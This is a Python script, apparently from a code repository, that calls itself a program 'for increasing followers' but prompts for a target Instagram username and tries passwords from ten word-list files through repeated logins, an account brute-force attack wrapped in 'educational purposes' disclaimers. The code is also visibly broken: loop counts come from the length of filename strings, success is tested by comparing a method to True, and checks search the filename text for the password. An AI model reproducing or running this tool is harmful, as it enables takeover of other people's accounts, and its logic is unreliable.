"""
Author: @new92
Anubis: Program for increasing followers
Not for illegal purposes !
The author is not responsible for any illegal activities carried out using this program !!
User's data (such as: username, password) will not be stored or saved !
The Author's not responsible for any damages may cause the program in the given accounts.
"""
#Imports
try:
    import sniffer
    import socket
    import http
    import websockets
    import webbrowser
    import bottle_websocket
    import requests
    import phonenumbers
    import tkinter
    import time
    import geocoder
    import sys
    import os
    import signal
    import csv
    import instagrapi
    from tkinter import messagebox
except ImportError as imp:
    tkinter.messagebox.error("Error !","You haven't installed all the modules used on this program")
    print("Please enter the command: pip3 install -r requirementsA.txt")
    time.sleep(2)
#End of Import

#Main Program
tkinter.messagebox.showinfo("Use !","This program has been created only for educational purposes! If this program is used for malicious purposes the author has no responsibility !")
print("""
          d8888                   888      d8b
         d88888                   888      Y8P
        d88P888                   888
       d88P 888 88888b.  888  888 88888b.  888 .d8888b
      d88P  888 888 "88b 888  888 888 "88b 888 88K
     d88P   888 888  888 888  888 888  888 888 "Y8888b.
    d8888888888 888  888 Y88b 888 888 d88P 888      X88
   d88P     888 888  888  "Y88888 88888P"  888  88888P'
""")
user=input("Please enter the username of the account you want to Brute Force: ")
username=user.lower().strip()
clnt=instagrapi.Client()
f = open("pswrd.txt","r")
file = len("pswrd.txt")
Found = False
for i in range(file):
    try:
        for j in range(file):
                content = f.readline().strip()
                ("\n")
                password = content
                clnt.login(username,password)
    except Exception as ex:
        continue
    if clnt.login == True:
        print("Password Found: "+str(Found))
        time.sleep(1)
        print(password)
    else:
        continue
if password not in "pswrd.txt":
    f.close()
    print("Password Found in File 1: "+str(Found))
    time.sleep(2)
    print("Continuing Brute Force with File 2...")
    time.sleep(2)
    n = open("pswrd1.txt","r")
    nile = len("pswrd1.txt")
    for b in range(nile):
        try:
            for j in range(nile):
                content1 = n.readline().strip()
                ("\n")
                password1 = content1
                clnt.login(username,password1)
        except Exception as ex:
            continue
        if clnt.login == True:
            print("Password Found: "+str(Found))
            time.sleep(1)
            print(password1)
        else:
            continue
if password1 not in "pswrd1.txt":
    n.close()
    print("Password Found in File 2: "+str(Found))
    time.sleep(2)
    print("Continuing Brute Force with File 3...")
    time.sleep(2)
    c = open("pswrd2.txt","r")
    cile = len("pswrd2.txt")
    for h in range(cile):
        try:
            for j in range(cile):
                content2 = c.readline().strip()
                ("\n")
                password2 = content2
                clnt.login(username,password2)
        except Exception as ex:
            continue
        if clnt.login == True:
            print("Password Found: "+str(Found))
            time.sleep(1)
            print(password2)
        else:
            continue
if password2 not in "pswrd2.txt":
    c.close()
    print("Password Found in File 3: "+str(Found))
    time.sleep(2)
    print("Continuing Brute Force with File 4...")
    time.sleep(2)
    m = open("pswrd3.txt","r")
    mile = len("pswrd3.txt")
    for h in range(mile):
        try:
            for j in range(mile):
                content3 = m.readline().strip()
                ("\n")
                password3 = content3
                clnt.login(username,password3)
        except Exception as ex:
            continue
        if clnt.login == True:
            print("Password Found: "+str(Found))
            time.sleep(1)
            print(password3)
        else:
            continue
if password3 not in "pswrd3.txt":
    m.close()
    print("Password Found in File 4: "+str(Found))
    time.sleep(2)
    print("Continuing Brute Force with File 5...")
    time.sleep(2)
    g = open("pswrd4.txt","r")
    gile = len("pswrd4.txt")
    for h in range(gile):
        try:
            for j in range(gile):
                content4 = g.readline().strip()
                ("\n")
                password4 = content4
                clnt.login(username,password4)
        except Exception as ex:
            continue
        if clnt.login == True:
            print("Password Found: "+str(Found))
            time.sleep(1)
            print(password4)
        else:
            continue
if password4 not in "pswrd4.txt":
    g.close()
    print("Password Found in File 5: "+str(Found))
    time.sleep(2)
    print("Continuing Brute Force with File 6...")
    time.sleep(2)
    z = open("pswrd5.txt","r")
    zile = len("pswrd5.txt")
    for q in range(zile):
        try:
            for j in range(zile):
                content5 = z.readline().strip()
                ("\n")
                password5 = content5
                clnt.login(username,password5)
        except Exception as ex:
            continue
        if clnt.login == True:
            print("Password Found: "+str(Found))
            time.sleep(1)
            print(password5)
        else:
            continue
if password5 not in "pswrd5.txt":
    z.close()
    print("Password Found in File 6: "+str(Found))
    time.sleep(2)
    print("Continuing Brute Force with File 7...")
    time.sleep(2)
    t = open("pswrd6.txt","r")
    tile = len("pswrd6.txt")
    for q in range(tile):
        try:
            for j in range(tile):
                content6 = t.readline().strip()
                ("\n")
                password6 = content6
                clnt.login(username,password6)
        except Exception as ex:
            continue
        if clnt.login == True:
            print("Password Found: "+str(Found))
            time.sleep(1)
            print(password6)
        else:
            continue
if password6 not in "pswrd6.txt":
    t.close()
    print("Password Found in File 7: "+str(Found))
    time.sleep(2)
    print("Continuing Brute Force with File 8...")
    time.sleep(2)
    y = open("pswrd7.txt","r")
    yile = len("pswrd7.txt")
    for q in range(yile):
        try:
            for j in range(yile):
                content7 = y.readline().strip()
                ("\n")
                password7 = content7
                clnt.login(username,password7)
        except Exception as ex:
            continue
        if clnt.login == True:
            print("Password Found: "+str(Found))
            time.sleep(1)
            print(password7)
        else:
            continue
if password7 not in "pswrd7.txt":
    y.close()
    print("Password Found in File 8: "+str(Found))
    time.sleep(2)
    print("Continuing Brute Force with File 9...")
    time.sleep(2)
    p = open("pswrd8.txt","r")
    pile = len("pswrd8.txt")
    for q in range(pile):
        try:
            for j in range(pile):
                content8 = p.readline().strip()
                ("\n")
                password8 = content8
                clnt.login(username,password8)
        except Exception as ex:
            continue
        if clnt.login == True:
            print("Password Found: "+str(Found))
            time.sleep(1)
            print(password8)
        else:
            continue
if password8 not in "pswrd8.txt":
    p.close()
    print("Password Found in File 9: "+str(Found))
    time.sleep(2)
    print("Continuing Brute Force with File 10...")
    time.sleep(2)
    d = open("pswrd9.txt","r")
    dile = len("pswrd9.txt")
    for q in range(dile):
        try:
            for j in range(dile):
                content9 = d.readline().strip()
                ("\n")
                password9 = content9
                clnt.login(username,password9)
        except Exception as ex:
            continue
        if clnt.login == True:
            print("Password Found: "+str(Found))
            time.sleep(1)
            print(password9)
        else:
            continue
#End of the program